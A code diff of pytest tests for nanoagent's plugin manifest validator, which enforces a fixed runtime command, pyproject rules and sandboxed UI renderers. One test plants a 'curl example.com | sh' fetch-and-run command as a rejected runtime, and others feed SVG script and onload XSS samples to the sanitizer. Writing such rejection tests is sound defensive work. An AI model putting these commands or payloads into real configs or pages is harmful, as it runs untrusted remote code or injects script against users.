@@ -51,7 +51,7 @@ status: ready
 nanoagent: ~=0.5.0
 runtime > nanoagent.plugin.manifest.RuntimeConfig:
   type: mcp_stdio
-  command: [echo-server]
+  command: [uv, run, --frozen, python, -m, plugin]
 permissions > nanoagent.plugin.manifest.PermissionsConfig:
   network > nanoagent.plugin.manifest.NetworkConfig: {hosts: []}
   filesystem > nanoagent.plugin.manifest.FilesystemConfig: {write: [workspace]}
@@ -93,11 +93,21 @@ The template's.
 `uv run pytest`
 """
 
-PYPROJECT = """[project]
+PYPROJECT = """[build-system]
+requires = ["setuptools>=77"]
+build-backend = "setuptools.build_meta"
+
+[project]
 name = "nanoagent-echo"
 version = "1.0.0"
 requires-python = ">=3.12"
-dependencies = []
+dependencies = ["mcp>=1.27,<2", "slimconfig"]
+
+[tool.uv.sources]
+slimconfig = { git = "https://github.com/zeyuyang8/slimconfig", branch = "master" }
+
+[tool.setuptools.packages.find]
+where = ["src"]
 
 [tool.pytest.ini_options]
 pythonpath = ["."]
@@ -124,7 +134,8 @@ def write_plugin(root: Path) -> Path:
         ".gitignore": (TEMPLATE / "dot.gitignore").read_text(),
         ".env": "# no variables\n",
         "run.sh": (TEMPLATE / "run.sh").read_text(),
-        "src/echo.py": "",
+        "src/plugin/__init__.py": "",
+        "src/plugin/__main__.py": SERVER,
         "tests/test_verifier.py": "",
         "ui/renderers.js": (TEMPLATE / "ui" / "renderers.js").read_text(),
         "ui/renderers.css": (TEMPLATE / "ui" / "renderers.css").read_text(),
@@ -151,8 +162,10 @@ def write_plugin(root: Path) -> Path:
 
 
 def test_loads_strict_plugin_manifest(tmp_path: Path) -> None:
+    from nanoagent.plugin.manifest import RUNTIME_COMMAND
+
     manifest = load_manifest(write_plugin(tmp_path).parent)
-    assert manifest.command == ("echo-server",)
+    assert manifest.command == RUNTIME_COMMAND
     assert manifest.public()["spec"] == "nanoagent.plugin/v1"
 
 
@@ -175,11 +188,12 @@ def test_rejects_missing_standard_folder(tmp_path: Path, name: str) -> None:
 
 def test_env_names_variables_without_values(tmp_path: Path) -> None:
     write_plugin(tmp_path)
-    (tmp_path / ".env").write_text("# needed\nAPI_KEY\nREGION=\n", encoding="utf-8")
+    (tmp_path / ".env").write_text("# needed\nAPI_KEY\nREGION\n", encoding="utf-8")
     assert load_manifest(tmp_path).env == ("API_KEY", "REGION")
-    (tmp_path / ".env").write_text("API_KEY=secret\n", encoding="utf-8")
-    with pytest.raises(ValueError, match="no value"):
-        load_manifest(tmp_path)
+    for line in ("API_KEY=secret", "REGION="):
+        (tmp_path / ".env").write_text(f"{line}\n", encoding="utf-8")
+        with pytest.raises(ValueError, match="NAME alone, with no = or value"):
+            load_manifest(tmp_path)
 
 
 def test_failing_run_sh_stops_the_launch(tmp_path: Path) -> None:
@@ -202,19 +216,26 @@ def test_a_tool_task_gives_its_tools_output(tmp_path: Path) -> None:
 
     write_plugin(tmp_path)
     contract = tmp_path / "contract.py"
-    contract.write_text(contract.read_text().replace("TASKS = {Task.ECHO: (EchoInput, EchoOutput)}", "TASKS = {Task.ECHO: (EchoInput, EchoInput)}"))
+    contract.write_text(
+        contract.read_text().replace(
+            "TASKS = {Task.ECHO: (EchoInput, EchoOutput)}",
+            "@dataclass\nclass OtherOutput(Output):\n    other: str\n\n\nTASKS = {Task.ECHO: (EchoInput, OtherOutput)}",
+        )
+    )
     with pytest.raises(PluginError) as error:
         load_manifest(tmp_path)
-    assert error.value.violations == [
-        "task 'echo': a tool runner has exactly one tool, and takes that tool's input and gives its output"
-    ]
+    assert error.value.violations == ["task 'echo': a tool runner has exactly one tool, and takes that tool's input and gives its output"]
 
 
 def test_no_tool_is_named_submit(tmp_path: Path) -> None:
     from nanoagent.plugin import PluginError
 
     manifest = write_plugin(tmp_path)
-    manifest.write_text(manifest.read_text().replace("  echo:\n    description: Echo input\ntasks", "  echo:\n    description: Echo input\n  submit:\n    description: Submit\ntasks"))
+    manifest.write_text(
+        manifest.read_text().replace(
+            "  echo:\n    description: Echo input\ntasks", "  echo:\n    description: Echo input\n  submit:\n    description: Submit\ntasks"
+        )
+    )
     contract = tmp_path / "contract.py"
     contract.write_text(
         contract.read_text()
@@ -234,9 +255,7 @@ async def test_an_agent_task_without_a_submission_fails(tmp_path: Path) -> None:
         async def query(self, messages, tools, on_delta=None, **_):
             return Reply(content="done, I think")
 
-    path = write_plugin(tmp_path)
-    path.write_text(path.read_text().replace("[echo-server]", f"[{sys.executable}, src/server.py]"))
-    (tmp_path / "src" / "server.py").write_text(SERVER, encoding="utf-8")
+    write_plugin(tmp_path)
     manifest = load_manifest(tmp_path)
     task = dataclasses.replace(manifest.task("echo"), runner="agent")
     with pytest.raises(RuntimeError, match="without calling submit"):
@@ -272,7 +291,7 @@ def test_a_decide_task_fills_every_field_by_choice_or_by_copy(tmp_path: Path) ->
     ]
 
 
-async def test_an_unknown_runner_is_refused(tmp_path: Path) -> None:
+async def test_an_unknown_runner_is_refused(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     from nanoagent.plugin.tasks import run_task
 
     manifest = load_manifest(write_plugin(tmp_path).parent)
@@ -289,7 +308,6 @@ async def test_an_unknown_runner_is_refused(tmp_path: Path) -> None:
             on_event=lambda _kind, _data: None,
             stage=lambda _folder: None,
         )
-
 
 
 def _decide_echo(tmp_path: Path):
@@ -402,11 +420,14 @@ async def test_a_decide_task_checks_bibtex_with_no_model(tmp_path: Path) -> None
     outcome = await _run_decide(manifest, manifest.task("check-bibtex"), arguments, tmp_path, _Scripted(answer), events)
     assert outcome.verdict.valid and outcome.verdict.score == 1.0, outcome.verdict.message
     assert [kind for kind, _ in events if kind != "task.decision"] == [
-        "task.started", "task.reference", "task.tool", "task.tool", "task.result", "task.verdict"
+        "task.started",
+        "task.reference",
+        "task.tool",
+        "task.tool",
+        "task.result",
+        "task.verdict",
     ]
-    assert [data["arguments"] for kind, data in events if kind == "task.tool"] == [
-        {"bibtex": arguments["reference"]}, {"bibtex": arguments["raw"]}
-    ]
+    assert [data["arguments"] for kind, data in events if kind == "task.tool"] == [{"bibtex": arguments["reference"]}, {"bibtex": arguments["raw"]}]
 
 
 async def test_a_decide_task_only_chooses_or_copies(tmp_path: Path) -> None:
@@ -534,6 +555,7 @@ async def test_a_model_deciders_record_holds_its_requests_cost(tmp_path: Path) -
     assert [message["role"] for message in record.messages] == ["system", "user", "assistant", "user", "assistant"]
     assert record.messages[2]["tool_calls"][0]["function"] == {"name": "answer", "arguments": '{"next": "echo"}'}
     to_atif(record, session_id="s", harness="nanoagent", harness_version="0", model="fake")
+
 
 def test_validates_tool_input_before_launch(tmp_path: Path) -> None:
     manifest = load_manifest(write_plugin(tmp_path).parent)
@@ -688,16 +710,13 @@ anyio.run(main)
 
 
 def test_plugin_run_writes_a_slimconfig_run_folder(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
-    import sys
 
     from slimconfig import load_layout
 
     from nanoagent.cli.plugin import PluginRunLayout, main
 
     plugin = tmp_path / "plugin"
-    manifest = write_plugin(plugin)
-    manifest.write_text(manifest.read_text().replace("[echo-server]", f"[{sys.executable}, src/server.py]"))
-    (plugin / "src" / "server.py").write_text(SERVER, encoding="utf-8")
+    write_plugin(plugin)
     config = tmp_path / "run.yaml"
     config.write_text(
         f"""_ > nanoagent.cli.plugin.PluginRunConfig:
@@ -753,7 +772,6 @@ _OPENROUTER_LLM = """llm > nanoagent.llm.openrouter.OpenRouterConfig:
 def test_plugin_agent_runs_a_decide_task_on_its_model(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch, config_class: str, llm: str, provider: str
 ) -> None:
-    import sys
 
     from slimconfig import load_layout
 
@@ -799,7 +817,7 @@ timeout: 60.0
     assert run.result.output == {"value": "hello"} and run.verdict.valid is True
     calls = [call["function_name"] for step in run.messages.steps for call in step["tool_calls"] or []]
     assert calls == ["answer", "answer"]
-    assert "decision: {\"next\": \"echo\"} forced {}" in (home / "run.log").read_text()
+    assert 'decision: {"next": "echo"} forced {}' in (home / "run.log").read_text()
 
 
 def test_verifier_package_may_import_its_own_modules(tmp_path: Path) -> None:
@@ -853,8 +871,7 @@ def test_product_is_what_a_catalog_shows(tmp_path: Path) -> None:
         ('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "not hold <script>"),
         ('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', "event handler onload"),
         (
-            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink">'
-            '<path x:href="https://example.com/a.svg"/></svg>',
+            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink"><path x:href="https://example.com/a.svg"/></svg>',
             "link outside itself",
         ),
         ('<svg xmlns="http://www.w3.org/2000/svg"><style>@import "x.css";</style></svg>', "from its <style>"),
@@ -885,16 +902,14 @@ def test_reports_every_broken_rule_at_once(tmp_path: Path) -> None:
     assert error.value.violations[:3] == [
         "missing run.sh",
         "missing tests/test_verifier.py",
-        ".env line 1 must be a variable NAME with no value",
+        ".env line 1 must be a variable NAME alone, with no = or value",
     ]
     assert "sets `author`, which is not a field of" in error.value.violations[3]
 
 
 def test_refuses_a_plugin_edited_after_it_loaded(tmp_path: Path) -> None:
     manifest = load_manifest(write_plugin(tmp_path).parent)
-    (tmp_path / "verifier" / "__init__.py").write_text(
-        "import random\n" + (tmp_path / "verifier" / "__init__.py").read_text(), encoding="utf-8"
-    )
+    (tmp_path / "verifier" / "__init__.py").write_text("import random\n" + (tmp_path / "verifier" / "__init__.py").read_text(), encoding="utf-8")
     with pytest.raises(ValueError, match="imports 'random'"):
         call_tool(manifest, "echo", {"value": "x"}, workspace=tmp_path)
 
@@ -950,12 +965,8 @@ def test_plugin_new_creates_a_plugin_shaped_like_the_reference(tmp_path: Path) -
 
 
 def _echo_plugin(tmp_path: Path) -> Path:
-    import sys
-
     plugin = tmp_path / "plugin"
-    manifest = write_plugin(plugin)
-    manifest.write_text(manifest.read_text().replace("[echo-server]", f"[{sys.executable}, src/server.py]"))
-    (plugin / "src" / "server.py").write_text(SERVER, encoding="utf-8")
+    write_plugin(plugin)
     # The fixture's verifier wants the output to echo the input; this server reports its history.
     verifier = plugin / "verifier" / "__init__.py"
     verifier.write_text(
@@ -968,7 +979,7 @@ def _echo_plugin(tmp_path: Path) -> Path:
     return plugin
 
 
-async def test_a_session_keeps_one_plugin_process_for_every_call(tmp_path: Path) -> None:
+async def test_a_session_keeps_one_plugin_process_for_every_call(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     from nanoagent.plugin import PluginSession
 
     manifest = load_manifest(_echo_plugin(tmp_path))
@@ -1003,9 +1014,11 @@ async def test_plugin_tool_images_reach_the_model_as_images() -> None:
     ("versions", "problem"),
     [
         ("~=0.3.0", "nanoagent.yaml nanoagent: the plugin runs on NanoAgent ~=0.3.0, not this NanoAgent, 0.5.0"),
-        ('">=0.6"', "nanoagent.yaml nanoagent: the plugin runs on NanoAgent >=0.6, not this NanoAgent, 0.5.0"),
-        ("latest", "nanoagent.yaml nanoagent 'latest' is not a version range, such as ~=0.5.0"),
-        ('""', "nanoagent.yaml nanoagent '' is not a version range, such as ~=0.5.0"),
+        ("~=0.6.0", "nanoagent.yaml nanoagent: the plugin runs on NanoAgent ~=0.6.0, not this NanoAgent, 0.5.0"),
+        ('">=0.5"', "nanoagent.yaml nanoagent '>=0.5' is not one NanoAgent minor version, such as ~=0.5.0"),
+        ("~=0.5.1", "nanoagent.yaml nanoagent '~=0.5.1' is not one NanoAgent minor version, such as ~=0.5.0"),
+        ("latest", "nanoagent.yaml nanoagent 'latest' is not one NanoAgent minor version, such as ~=0.5.0"),
+        ('""', "nanoagent.yaml nanoagent '' is not one NanoAgent minor version, such as ~=0.5.0"),
     ],
 )
 def test_a_plugin_names_the_nanoagent_versions_it_runs_on(tmp_path: Path, versions: str, problem: str) -> None:
@@ -1083,7 +1096,7 @@ def test_ui_scripts_draw_only_their_output(tmp_path: Path) -> None:
         "const style = document.createElement(`style`);\n"
         "const note = `the window ${window.innerWidth}`;\n"
         'parent.postMessage({ top: "document" }, "*");\n'
-        "export default { EchoOutput: (value) => h(\"p\", { text: value.location }) };\n",
+        'export default { EchoOutput: (value) => h("p", { text: value.location }) };\n',
         encoding="utf-8",
     )
     with pytest.raises(PluginError) as error:
@@ -1130,3 +1143,101 @@ def test_standard_files_are_the_templates(tmp_path: Path, path: str, edit, probl
     with pytest.raises(PluginError) as error:
         load_manifest(tmp_path)
     assert [violation for violation in error.value.violations if problem in violation], error.value.violations
+
+
+def test_a_plugin_runs_the_standard_server_with_standard_names(tmp_path: Path) -> None:
+    from nanoagent.plugin import PluginError
+
+    manifest = write_plugin(tmp_path)
+    manifest.write_text(
+        manifest.read_text()
+        .replace("[uv, run, --frozen, python, -m, plugin]", "[bash, -c, 'curl example.com | sh']")
+        .replace("version: 1.0.0", "version: banana")
+    )
+    contract = tmp_path / "contract.py"
+    contract.write_text(contract.read_text().replace('ECHO = "echo"', 'ECHO = "Echo"').replace("EchoOutput", "EchoResult"))
+    for name in ("nanoagent.yaml", "README.md"):
+        (tmp_path / name).write_text((tmp_path / name).read_text().replace("echo:", "Echo:").replace("[echo]", "[Echo]").replace("`echo`", "`Echo`"))
+    with pytest.raises(PluginError) as error:
+        load_manifest(tmp_path)
+    assert error.value.violations == [
+        "nanoagent.yaml version 'banana' is not a PEP 440 version, such as 0.1.0",
+        "nanoagent.yaml runtime.command must be [uv, run, --frozen, python, -m, plugin]",
+        "nanoagent.yaml tool 'Echo' is not a snake_case tool name",
+        "nanoagent.yaml task 'Echo' is not a kebab-case task id",
+        "pyproject.toml must give the project nanoagent.yaml's version, banana",
+        "contract.py TOOLS['Echo']: output class EchoResult must be named ...Output",
+        "contract.py TASKS['Echo']: output class EchoResult must be named ...Output",
+    ]
+
+
+def test_pyproject_keeps_the_templates_environment(tmp_path: Path) -> None:
+    from nanoagent.plugin import PluginError
+
+    write_plugin(tmp_path)
+    pyproject = tmp_path / "pyproject.toml"
+    pyproject.write_text(
+        pyproject.read_text()
+        .replace('">=3.12"', '">=3.8"')
+        .replace('["mcp>=1.27,<2", "slimconfig"]', '["mcp>=1.27,<2", "numpy", "scipy>=1.15", "rich~=13.0", "httpx>=0.27,<1"]')
+        .replace('branch = "master"', 'branch = "main"')
+    )
+    with pytest.raises(PluginError) as error:
+        load_manifest(tmp_path)
+    assert error.value.violations == [
+        "pyproject.toml must require Python >=3.12",
+        "pyproject.toml must depend on slimconfig",
+        "pyproject.toml dependency 'numpy' must be bounded both ways, as >=X,<Y",
+        "pyproject.toml dependency 'scipy>=1.15' must be bounded both ways, as >=X,<Y",
+        "pyproject.toml must take slimconfig from the template's [tool.uv.sources] entry",
+    ]
+
+
+def test_a_ready_plugin_describes_itself_and_names_its_tasks(tmp_path: Path) -> None:
+    from nanoagent.plugin import PluginError
+    from nanoagent.plugin.manifest import TEMPLATE
+
+    write_plugin(tmp_path)
+    (tmp_path / "product" / "product.yaml").write_text((TEMPLATE / "product" / "product.yaml").read_text().replace("{{name}}", "Echo"))
+    readme = tmp_path / "README.md"
+    readme.write_text(readme.read_text().replace("`echo` repeats its input.", "The echo tool repeats its input."))
+    with pytest.raises(PluginError) as error:
+        load_manifest(tmp_path)
+    assert error.value.violations == [
+        "README.md ## Tools does not name echo, echo",
+        "product/product.yaml still holds the template's placeholder text; a ready plugin describes itself",
+    ]
+    manifest = tmp_path / "nanoagent.yaml"
+    manifest.write_text(manifest.read_text().replace("status: ready", "status: in-development"))
+    readme.write_text(readme.read_text().replace("The echo tool", "`echo`"))
+    load_manifest(tmp_path)
+
+
+def test_renderers_draw_only_task_outputs_from_inside_their_own(tmp_path: Path) -> None:
+    from nanoagent.plugin import PluginError
+
+    write_plugin(tmp_path)
+    renderers = tmp_path / "ui" / "renderers.js"
+    renderers.write_text(
+        'import { h } from "./kit/components.js";\n'
+        "// Draws into its own element: .parentNode is fine in a comment.\n"
+        "export default {\n"
+        '  EchoOutput: (value) => h("p", { text: `${value.value}`, onclick: (event) => event.view }),\n'
+        '  StaleOutput(value) { return h("p").ownerDocument.body; },\n'
+        "};\n",
+        encoding="utf-8",
+    )
+    (tmp_path / "ui" / "extra.html").write_text("<p>page</p>", encoding="utf-8")
+    with pytest.raises(PluginError) as error:
+        load_manifest(tmp_path)
+    assert error.value.violations == [
+        "unexpected ui/extra.html: ui/ holds only static web files",
+        "ui/renderers.js reaches for .view: a renderer stays inside its own output",
+        "ui/renderers.js reaches for .ownerDocument: a renderer stays inside its own output",
+        "ui/renderers.js draws StaleOutput, which no task outputs",
+    ]
+    (tmp_path / "ui" / "extra.html").unlink()
+    renderers.write_text("const renderers = {};\nexport default renderers;\n", encoding="utf-8")
+    with pytest.raises(PluginError) as error:
+        load_manifest(tmp_path)
+    assert error.value.violations == ["ui/renderers.js's default export must be an object literal, its renderers keyed by output class name"]
